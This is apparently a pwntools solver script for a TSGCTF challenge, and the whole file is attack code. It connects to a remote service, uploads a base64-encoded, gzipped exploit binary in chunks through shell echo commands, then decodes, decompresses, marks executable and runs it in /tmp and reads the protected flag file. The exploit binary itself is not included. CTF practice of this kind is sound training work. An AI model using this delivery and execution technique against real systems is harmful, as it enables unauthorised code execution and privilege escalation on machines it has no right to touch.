#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

hosts = ("34.146.42.170","localhost","localhost")
ports = (25252,25252,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')

## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  global c
  ## If PoW is required...
  #hashcat = c.recvline().rstrip().decode('utf-8')
  #print("[+] calculating PoW...")
  #hash_res = os.popen(hashcat).read()
  #print("[+] finished calc hash: " + hash_res)
  #c.sendline(hash_res)

  # before run this script, compile/gzip/base64 the exploit.
  with open("./exploit.gz.b64", 'r') as f:
    binary = f.read()

  progress = 0
  N = 0x300
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  c.sendlineafter('$', 'cd /tmp')
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter('/tmp $', 'echo -n "{}" >> ./exploit.gz.b64'.format(s)) # don't forget -n
    progress += N
    if progress % N == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))

  print("[+] finish sending exploit.")
  c.sendlineafter('$', 'base64 -d ./exploit.gz.b64 > exploit.gz')
  c.sendlineafter('$', 'gunzip ./exploit.gz')

  c.sendlineafter('$', 'chmod +x ./exploit')
  c.sendlineafter('$', './exploit')

  c.sendlineafter('$', 'cat /home/user/flag')
  c.recvline()
  flag = c.recvline()
  print(flag)
  if "TSGCTF{" in flag:
    exit(0)
  else:
    exit(1)

## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv) != 3:
      exit(2)
    else:
      c = remote(sys.argv[1], sys.argv[2])
    exploit()
